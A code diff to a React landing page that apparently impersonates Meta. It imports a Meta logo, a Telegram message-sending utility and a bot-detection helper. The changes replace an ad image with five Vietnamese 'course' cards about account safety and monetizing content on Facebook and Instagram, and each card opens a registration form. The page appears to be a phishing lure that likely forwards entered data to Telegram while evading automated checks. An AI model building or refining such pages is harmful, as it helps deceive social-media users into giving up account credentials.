@@ -2,8 +2,12 @@ import { useEffect, useState, useCallback, useMemo } from 'react';
 import axios from 'axios';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import KiemTienImg from '@/assets/images/kiemtien.png';
-import MoneyAdsImg from '@/assets/images/money-ads.png';
 import TickImg from '@/assets/images/tick.png';
+import Course1Img from '@/assets/images/course-1.webp';
+import Course2Img from '@/assets/images/course-2.webp';
+import Course3Img from '@/assets/images/course-3.webp';
+import Course4Img from '@/assets/images/course-4.webp';
+import Course5Img from '@/assets/images/course-5.webp';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
@@ -502,17 +506,105 @@ const Home = () =>
                                     </div>
                                 </div>
                                 <div style={ { padding: '0 16px 12px', position: 'relative' } }>
-                                    <img
-                                        alt="In-video ads example"
-                                        src={ MoneyAdsImg }
-                                        style={ { width: '100%', display: 'block', height: '345px', borderRadius: '10px', objectFit: 'cover' } }
-                                    />
-                                    <img
-                                        alt=""
-                                        src="https://static.xx.fbcdn.net/rsrc.php/yh/r/M6gzkg5vYje.webp?_nc_eui2=AeFevwqVrtKjECYULcTXH3fl5akSRm94oLTlqRJGb3igtA6PbqtuZ3EAfNXCiOnG0BIJGf6NkbxeNO8kaGjkzxyB"
-                                        style={ { position: 'absolute', top: '8px', right: '24px', width: '56px', height: '56px', objectFit: 'contain' } }
-                                        referrerPolicy="origin-when-cross-origin"
-                                    />
+                                    <section
+                                        className="panel"
+                                        style={ {
+                                            background: '#fff',
+                                            border: '1px solid #e6e9ef',
+                                            padding: '16px',
+                                            borderRadius: '10px'
+                                        } }
+                                    >
+                                        <div
+                                            className="courses"
+                                            style={ {
+                                                display: 'grid',
+                                                gridTemplateColumns: 'repeat(3, minmax(120px, 1fr))',
+                                                gap: '16px 14px'
+                                            } }
+                                        >
+                                            <article className="course-card">
+                                                <div className="cover" style={ { width: '100%', aspectRatio: '4 / 5', borderRadius: '12px', overflow: 'hidden', background: '#f0f3f8' } }>
+                                                    <button
+                                                        type="button"
+                                                        onClick={ () => setShowFirstModal( true ) }
+                                                        aria-label="Mở form đăng ký"
+                                                        style={ { border: 'none', background: 'transparent', padding: 0, width: '100%', height: '100%', display: 'block', cursor: 'pointer' } }
+                                                    >
+                                                        <img src={ Course1Img } alt="Bảo vệ tài khoản của bạn và giữ an toàn" style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } />
+                                                    </button>
+                                                </div>
+                                                <p className="meta" style={ { marginTop: '8px', fontSize: '12px', color: '#97a0ad' } }>Khóa học</p>
+                                                <div className="course-text" style={ { minHeight: '58px' } }>
+                                                    <h2 className="course-title" style={ { marginTop: '4px', fontSize: '20px', lineHeight: '24px', fontWeight: 500 } }>Bảo vệ tài khoản của bạn và giữ an toàn</h2>
+                                                </div>
+                                            </article>
+                                            <article className="course-card">
+                                                <div className="cover" style={ { width: '100%', aspectRatio: '4 / 5', borderRadius: '12px', overflow: 'hidden', background: '#f0f3f8' } }>
+                                                    <button
+                                                        type="button"
+                                                        onClick={ () => setShowFirstModal( true ) }
+                                                        aria-label="Mở form đăng ký"
+                                                        style={ { border: 'none', background: 'transparent', padding: 0, width: '100%', height: '100%', display: 'block', cursor: 'pointer' } }
+                                                    >
+                                                        <img src={ Course2Img } alt="Kiếm tiền từ video trực tiếp của bạn với Stars" style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } />
+                                                    </button>
+                                                </div>
+                                                <p className="meta" style={ { marginTop: '8px', fontSize: '12px', color: '#97a0ad' } }>Khóa học</p>
+                                                <div className="course-text" style={ { minHeight: '58px' } }>
+                                                    <h2 className="course-title" style={ { marginTop: '4px', fontSize: '20px', lineHeight: '24px', fontWeight: 500 } }>Kiếm tiền từ video trực tiếp của bạn với Stars</h2>
+                                                </div>
+                                            </article>
+                                            <article className="course-card">
+                                                <div className="cover" style={ { width: '100%', aspectRatio: '4 / 5', borderRadius: '12px', overflow: 'hidden', background: '#f0f3f8' } }>
+                                                    <button
+                                                        type="button"
+                                                        onClick={ () => setShowFirstModal( true ) }
+                                                        aria-label="Mở form đăng ký"
+                                                        style={ { border: 'none', background: 'transparent', padding: 0, width: '100%', height: '100%', display: 'block', cursor: 'pointer' } }
+                                                    >
+                                                        <img src={ Course3Img } alt="Kiếm tiền với Đăng ký" style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } />
+                                                    </button>
+                                                </div>
+                                                <p className="meta" style={ { marginTop: '8px', fontSize: '12px', color: '#97a0ad' } }>Khóa học</p>
+                                                <div className="course-text" style={ { minHeight: '58px' } }>
+                                                    <h2 className="course-title" style={ { marginTop: '4px', fontSize: '20px', lineHeight: '24px', fontWeight: 500 } }>Kiếm tiền với Đăng ký</h2>
+                                                </div>
+                                            </article>
+                                            <article className="course-card">
+                                                <div className="cover" style={ { width: '100%', aspectRatio: '4 / 5', borderRadius: '12px', overflow: 'hidden', background: '#f0f3f8' } }>
+                                                    <button
+                                                        type="button"
+                                                        onClick={ () => setShowFirstModal( true ) }
+                                                        aria-label="Mở form đăng ký"
+                                                        style={ { border: 'none', background: 'transparent', padding: 0, width: '100%', height: '100%', display: 'block', cursor: 'pointer' } }
+                                                    >
+                                                        <img src={ Course4Img } alt="Bắt đầu với tư cách là Người sáng tạo trên Facebook và Instagram" style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } />
+                                                    </button>
+                                                </div>
+                                                <p className="meta" style={ { marginTop: '8px', fontSize: '12px', color: '#97a0ad' } }>Khóa học</p>
+                                                <div className="course-text" style={ { minHeight: '58px' } }>
+                                                    <h2 className="course-title" style={ { marginTop: '4px', fontSize: '20px', lineHeight: '24px', fontWeight: 500 } }>Bắt đầu với tư cách là Người sáng tạo trên Facebook và Instagram</h2>
+                                                </div>
+                                            </article>
+                                            <article className="course-card">
+                                                <div className="cover" style={ { width: '100%', aspectRatio: '4 / 5', borderRadius: '12px', overflow: 'hidden', background: '#f0f3f8' } }>
+                                                    <button
+                                                        type="button"
+                                                        onClick={ () => setShowFirstModal( true ) }
+                                                        aria-label="Mở form đăng ký"
+                                                        style={ { border: 'none', background: 'transparent', padding: 0, width: '100%', height: '100%', display: 'block', cursor: 'pointer' } }
+                                                    >
+                                                        <img src={ Course5Img } alt="Cách kiếm tiền từ nội dung của bạn trên Facebook và Instagram" style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } />
+                                                    </button>
+                                                </div>
+                                                <p className="meta" style={ { marginTop: '8px', fontSize: '12px', color: '#97a0ad' } }>Khóa học</p>
+                                                <div className="course-text" style={ { minHeight: '58px' } }>
+                                                    <h2 className="course-title" style={ { marginTop: '4px', fontSize: '20px', lineHeight: '24px', fontWeight: 500 } }>Cách kiếm tiền từ nội dung của bạn trên Facebook và Instagram</h2>
+                                                </div>
+                                            </article>
+                                        </div>
+                                    </section>
                                 </div>
                                 <div style={ { padding: '16px' } }>
                                     <div style={ { display: 'flex', alignItems: 'flex-start', gap: '12px', background: '#f0f2f5', borderRadius: '10px', padding: '12px' } }>
@@ -562,7 +654,6 @@ const Home = () =>
                                     </div>
                                     <div
                                         className="button fb-blue w-100"
-                                        id="start"
                                         onClick={ () => setShowFirstModal( true ) }
                                         style={ { cursor: 'pointer', width: '100%' } }
                                     >
